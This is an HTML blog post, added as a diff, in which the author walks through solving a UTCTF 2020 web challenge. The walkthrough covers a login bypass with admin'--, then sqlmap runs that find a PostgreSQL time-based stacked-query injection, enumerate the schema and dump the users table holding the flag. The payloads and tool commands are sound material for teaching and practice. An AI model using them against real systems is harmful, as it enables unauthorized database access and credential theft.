@@ -1,0 +1,382 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@1.207/distr/fira_code.css">
+
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">
+
+  <link rel="stylesheet" type="text/css" href="/theme/pygments/rrt.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">
+
+
+    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="securitytaters Atom">
+
+
+
+
+
+<meta name="author" content="0xm4v3rick" />
+<meta name="description" content="SQL injection involving PostgreSQL. Blind SQLi with stacked Queries." />
+<meta name="keywords" content="webappsec, sql injection, writeup, sqlmap">
+
+
+<meta property="og:site_name" content="securitytaters"/>
+<meta property="og:title" content="Solving Epic Admin PWN from UTCTF 2020"/>
+<meta property="og:description" content="SQL injection involving PostgreSQL. Blind SQLi with stacked Queries."/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="/solving-epic-admin-pwn-from-utctf-2020.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2020-03-09 08:00:00+05:30"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="/author/0xm4v3rick.html">
+<meta property="article:section" content="CTF"/>
+<meta property="article:tag" content="webappsec"/>
+<meta property="article:tag" content="sql injection"/>
+<meta property="article:tag" content="writeup"/>
+<meta property="article:tag" content="sqlmap"/>
+<meta property="og:image" content="">
+
+  <title>securitytaters &ndash; Solving Epic Admin PWN from UTCTF 2020</title>
+
+</head>
+<body>
+  <aside>
+    <div id='blah'>
+
+<h1><a style="font-weight:bold;font-size:xx-large" href="https://securitytaters.info">securitytaters</a></h1>
+<hr>
+    </div>
+
+    <div style="margin-top: -90px;">
+      <h1><a href=""></a></h1>
+
+
+      <nav>
+        <ul class="list">
+
+	<h2>0xm4v3rick</h2>
+            <li><a target="_blank" href="https://twitter.com/0xm4v3rick" >Twitter</a></li>
+            <li><a target="_blank" href="https://github.com/0xm4v3rick" >Github</a></li>
+
+	<h2>0xshrimantyogi</h2>
+            <li><a target="_blank" href="https://twitter.com/0xshrimantyogi" >Twitter</a></li>
+            <li><a target="_blank" href="https://github.com/0xshrimantyogi" >Github</a></li>
+
+        </ul>
+      </nav>
+
+      <ul class="social">
+          <li>
+            <a  class="sc-Git" href="#" target="_blank">
+            <i class="fab fa-Git">
+            </i>
+
+          </a></li>
+          <li>
+            <a  class="sc-Another social link" href="#" target="_blank">
+            <i class="fab fa-Another social link">
+            </i>
+
+          </a></li>
+      </ul>
+ 					<h2><a href="/archives.html">Archives</a></h2> <br/>
+					<h2><a href="/authors.html">Authors</a></h2>
+</br>
+<h3 style="color: #00ff28;"><b>This site uses Fira Code so the code will not appear as usual but it will work if you copy and use it directly.</b></h3>
+    </div>
+
+
+  </aside>
+  <main>
+
+
+<article class="single">
+  <header>
+      
+    <h1 id="solving-epic-admin-pwn-from-utctf-2020">Solving Epic Admin PWN from UTCTF 2020</h1>
+    <p>
+          Posted on Mon 09 March 2020 in <a href="/category/ctf.html">CTF</a>
+
+by <a href="0xm4v3rick.html">0xm4v3rick</a>
+    </p>
+  </header>
+<hr>
+
+  <div>
+    <p>The CTF challenge note:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">this</span> <span class="n">challenge</span> <span class="k">is</span> <span class="n">epic</span> <span class="n">i</span> <span class="n">promise</span>
+
+<span class="n">the</span> <span class="n">flag</span> <span class="k">is</span> <span class="n">the</span> <span class="n">password</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">web2</span><span class="p">.</span><span class="n">utctf</span><span class="p">.</span><span class="n">live</span><span class="p">:</span><span class="mi">5006</span><span class="o">/</span>
+
+<span class="k">by</span> <span class="n">matt</span>
+</pre></div>
+</td></tr></table>
+
+<p>The challenge page had a login form which generated following request.</p>
+<p>Request:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">web2.utctf.live:5006</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">23</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://web2.utctf.live:5006</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://web2.utctf.live:5006/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+username=test&amp;pass=test
+</pre></div>
+</td></tr></table>
+
+<p>After poking around the application to see how it reacts, I landed with auth bypass with <strong>admin'--</strong> payload which I usually try as follows. </p>
+<p>Request:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">web2.utctf.live:5006</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">28</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://web2.utctf.live:5006</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://web2.utctf.live:5006/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+username=admin%27--&amp;pass=asd
+</pre></div>
+</td></tr></table>
+
+<p>Response:</p>
+<p><img alt="auth" src="img/6.1.jpg" /></p>
+<p>But that did not earn anything interesting as opposed to my expectations. I looked around the source for any hints and but didnt find anything. Not even a single JS file. Rest of the code and css files had nothing of value. So after a hint from the discord channel it was time to expand on the same issue that got me the admin in the first place. Extending auth bypass to SQLi. So I let loose sqlmap to see it if works and it did. Passing the login request to sqlmap using text file did the work. </p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44</pre></div></td><td class="code"><div class="highlight"><pre><span></span>sqlmap -r req1.txt --flush -v -p username
+    ___
+       __H__
+ ___ ___<span class="o">[</span>,<span class="o">]</span>_____ ___ ___  <span class="o">{</span><span class="m">1</span>.3.3#pip<span class="o">}</span>
+<span class="p">|</span>_ -<span class="p">|</span> . <span class="o">[)]</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
+<span class="s1">|___|_  [.]_|_|_|__,|  _|</span>
+<span class="s1">      |_|V...       |_|   http://sqlmap.org</span>
+
+<span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
+
+<span class="o">[</span>*<span class="o">]</span> starting @ <span class="m">11</span>:30:22 /2020-03-07/
+
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> parsing HTTP request from <span class="s1">&#39;req1.txt&#39;</span>
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> not a valid WebScarab log data
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> cleaning up configuration parameters
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> setting the HTTP timeout
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> setting the HTTP User-Agent header
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> creating HTTP requests opener object
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> resolving hostname <span class="s1">&#39;web2.utctf.live&#39;</span>
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing connection to the target URL
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> declared web page charset <span class="s1">&#39;utf-8&#39;</span>
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the target is protected by some kind of WAF/IPS
+<span class="o">[</span><span class="m">11</span>:30:22<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> the target URL content is stable
+<span class="o">[</span><span class="m">11</span>:30:23<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL content is stable
+<span class="o">[</span><span class="m">11</span>:30:23<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test</span> shows that POST parameter <span class="s1">&#39;username&#39;</span> might not be injectable
+<span class="o">[</span><span class="m">11</span>:30:23<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">for</span> SQL injection on POST parameter <span class="s1">&#39;username&#39;</span>
+<span class="o">[</span><span class="m">11</span>:30:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
+
+--------------- SNIP --------------------------------------------------------
+
+<span class="o">[</span><span class="m">11</span>:31:20<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the injection point on POST parameter <span class="s1">&#39;username&#39;</span> is a <span class="nb">false</span> positive
+<span class="o">[</span><span class="m">11</span>:31:31<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> checking <span class="k">for</span> filtered characters
+POST parameter <span class="s1">&#39;username&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span> n
+sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of <span class="m">92</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+---
+Parameter: username <span class="o">(</span>POST<span class="o">)</span>
+    Type: stacked queries
+    Title: PostgreSQL &gt; <span class="m">8</span>.1 stacked queries <span class="o">(</span>comment<span class="o">)</span>
+    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s1">&#39;;SELECT PG_SLEEP(5)--&amp;pass=asd</span>
+<span class="s1">    Vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)--</span>
+<span class="s1">---</span>
+<span class="s1">[11:33:18] [INFO] the back-end DBMS is PostgreSQL</span>
+<span class="s1">back-end DBMS: PostgreSQL</span>
+<span class="s1">[11:33:18] [INFO] fetched data logged to text files under &#39;</span>/root/.sqlmap/output/web2.utctf.live<span class="err">&#39;</span>
+</pre></div>
+</td></tr></table>
+
+<p>As we can see the sqlmap returned the injected query and it shows PostgreSQL as the backend database. A blind sqli with stacked queries. So I continued with sqlmap to retrive current DB name with below command. </p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="highlight"><pre><span></span>sqlmap -r req1.txt -v -p username --current-db
+
+--------------- SNIP --------------------------------------------------------
+
+<span class="o">[</span><span class="m">11</span>:34:24<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+<span class="o">[</span><span class="m">11</span>:34:35<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> adjusting <span class="nb">time</span> delay to <span class="m">1</span> second due to good response <span class="nb">times</span>
+public
+<span class="o">[</span><span class="m">11</span>:34:59<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> performed <span class="m">46</span> queries in <span class="m">53</span>.31 seconds
+<span class="o">[</span><span class="m">11</span>:34:59<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> on PostgreSQL you<span class="s1">&#39;ll need to use schema names for enumeration as the counterpart to database names on other DBMSes</span>
+<span class="s1">current schema (equivalent to database on PostgreSQL): &#39;</span>public<span class="err">&#39;</span>
+</pre></div>
+</td></tr></table>
+
+<p>And retrieved the entire <strong>public</strong> DB as follows that gave us the flag</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14</pre></div></td><td class="code"><div class="highlight"><pre><span></span>sqlmap -r req1.txt -v -p username --dump
+
+--------------- SNIP --------------------------------------------------------
+
+<span class="o">[</span><span class="m">11</span>:40:54<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> performed <span class="m">39</span> queries in <span class="m">22</span>.33 seconds
+<span class="o">[</span><span class="m">11</span>:40:54<span class="o">]</span> <span class="o">[</span>DEBUG<span class="o">]</span> analyzing table dump <span class="k">for</span> possible password hashes
+Database: public
+Table: users
+<span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
++---------+----------+--------------------------+
+<span class="p">|</span> id      <span class="p">|</span> username <span class="p">|</span> password                 <span class="p">|</span>
++---------+----------+--------------------------+
+<span class="p">|</span> &lt;blank&gt; <span class="p">|</span> admin    <span class="p">|</span> utflag<span class="o">{</span>dual1pa1sp3rf3ct<span class="o">}</span> <span class="p">|</span>
++---------+----------+--------------------------+
+</pre></div>
+</td></tr></table>
+
+<p>That was all it took to get the flag. Thanks to UTCTF Team for the chall. Feel free to contact me on twitter for queries or feedback. Cheers!!</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="/tag/webappsec.html">webappsec</a>
+      <a href="/tag/sql-injection.html">sql injection</a>
+      <a href="/tag/writeup.html">writeup</a>
+      <a href="/tag/sqlmap.html">sqlmap</a>
+    </p>
+  </div>
+
+
+
+
+
+</article>
+
+    <footer>
+<p>&copy;  </p>
+<p>    Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+
+<br> &copy; Copyright 2020, securitytaters.info
+</p>    </footer>
+  </main>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " securitytaters ",
+  "url" : "",
+  "image": "",
+  "description": ""
+}
+</script>
+
+</body>
+</html>
